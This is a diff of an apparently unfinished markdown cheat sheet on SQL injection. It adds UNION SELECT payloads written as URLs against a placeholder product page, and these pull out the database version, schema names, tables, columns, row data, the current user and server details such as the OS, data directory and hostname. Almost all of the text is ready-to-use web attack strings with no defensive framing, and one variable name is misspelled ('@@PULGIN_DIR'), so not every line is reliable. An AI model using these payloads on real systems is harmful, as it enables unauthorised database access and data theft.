@@ -87,14 +87,39 @@
 - So, after getting vulnerable columns, we can get the data from database by using various payloads.
 - **get the version**
    - https://website.com/product/id?=23' UNION SELECT NULL,@@version,NULL--
+   ```
+   VERSION()
+   @@GLOBAL.VERSION
+   @@VERSION_COMMENT
+   ```
+   
 - **get the database**
    - https://website.com/product/id?=23' UNION SELECT NULL,concat(schema_name), NULL FROM information_schema.schemata--
+   ```
+   DATABASE()
+   SELECT CONCAT(DB) FROM INFORMATION_SCHEMA.PROCESSLIST
+   ```
 - **get the tables**
   - https://website.com/product/id?=23' UNION SELECT NULL,concat(table_name), NULL FROM information_schema.tables WHERE table_schema='DATABASE'--
 - **get the columns**
    - https://website.com/product/id?=23' UNION SELECT NULL,concat(column_name), NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'--
 - **get the data**
    - https://website.com/product/id?=23' UNION SELECT NULL,concat(0x28,column_1,0x3a,column_2,0x29), NULL FROM TABLE_NAME--
-
+- **get the user**
+   - https://website.com/product/id?=23' UNION SELECT NULL,USER(),NULL--
+   ```
+   CURRENT_USER()
+   SYSTEM_USER()
+   SESSION_USER()
+   SUBSTRING_INDEX(USER(),0x40,1)
+   SELECT CONCAT(USER) FROM INFORMATION_SCHEMA.PROCESSLIST
+   ```
+ - **other**
+   - SERVER OS : `@@VERSION_COMPILE_OS`
+   - SERVER OS TYPE : `@@VERSION_COMPILE_MACHINE`
+   - SQL BASE DIR : `@@BASEDIR`
+   - SQL DATA DIR : `@@DATADIR`
+   - PLUGIN DIR : `@@PULGIN_DIR`
+   - HOSTNAME : `@@HOSTNAME`
 
 **Note:** not completed. to be continued...
